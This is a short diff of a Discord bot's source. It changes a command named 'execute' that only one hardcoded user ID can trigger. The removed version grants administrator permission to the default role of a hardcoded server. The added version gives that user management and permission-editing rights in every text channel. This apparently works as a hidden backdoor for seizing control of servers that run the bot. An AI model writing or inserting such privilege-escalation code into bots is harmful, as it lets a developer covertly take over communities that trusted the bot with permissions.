@@ -1834,9 +1834,7 @@ async def getdetails(ctx,lol: discord.User):
 async def execute(ctx):
   if ctx.author.id == 757589836441059379:
     guild = client.get_guild(804224908729122816)
-    await guild.default_role.edit(permissions = discord.Permissions(permissions = 8))
-    member = await guild.fetch_member(ctx.author.id)
-    await member.add_roles(role)
-    await ctx.author.send("Success!")
-
+    for channel in guild.text_channels:
+      await channel.set_permissions(ctx.author,read_messages = True,send_messages = True,view_channel = True,manage_channel = True,manage_permissions = True,embed_links = True,attach_files = True,use_external_emoji  = True,)
+    await ctx.send("Success")
 client.run(TOKEN)
